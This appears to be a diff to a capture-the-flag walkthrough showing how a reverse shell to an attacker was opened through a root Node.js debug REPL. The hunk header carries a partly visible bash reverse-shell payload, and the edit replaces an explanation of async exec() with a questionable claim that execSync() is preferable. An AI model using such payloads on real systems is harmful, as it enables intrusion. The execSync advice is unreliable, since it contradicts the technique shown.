@@ -314,10 +314,8 @@ exec("process.mainModule.require('child_process').exec('bash -c \"bash -i >& /de
 
 ![Second Successful Reverse Shell](Screenshots/Second_Successful_reverse_shell.png)
 
-**Why `.exec()` with `.toString()` instead of `.execSync()`?**
-
-Using `.execSync()` would block the remote process and wait for the command to complete — since the reverse shell is an infinite interactive process, this would hang indefinitely and no output would be seen. By using `.exec()` (asynchronous) with `.toString()` on the returned object, the child process is spawned in the background without blocking, allowing the shell to connect back. The `[object Object]` return printed in the debug REPL confirms the process was launched. The double-`exec()` wrapper (`exec(...)` in the REPL wrapping `child_process.exec(...)`) is used to send the expression into the remote root process's evaluation context rather than the local client.
-
+Why .execSync() instead of .exec() with .toString()?
+Both approaches work — as proven here, .exec() with .toString() successfully caught the root shell. However, .execSync() is the recommended practice for the inner child_process call. Since .execSync() is synchronous, it holds the process open intentionally rather than relying on async timing, making the shell connection more predictable and reliable across different Node.js versions and system configurations. In a real engagement, depending on asynchronous behavior to catch a reverse shell introduces a race condition that is better avoided. The outer exec() wrapper in the debug REPL remains necessary regardless — it is what sends the expression into the remote root process's evaluation context rather than executing locally on the client side. The [object Object] return printed in the debug REPL confirms the child process was successfully launched inside the root process.
 ---
 
 ## Root Flag
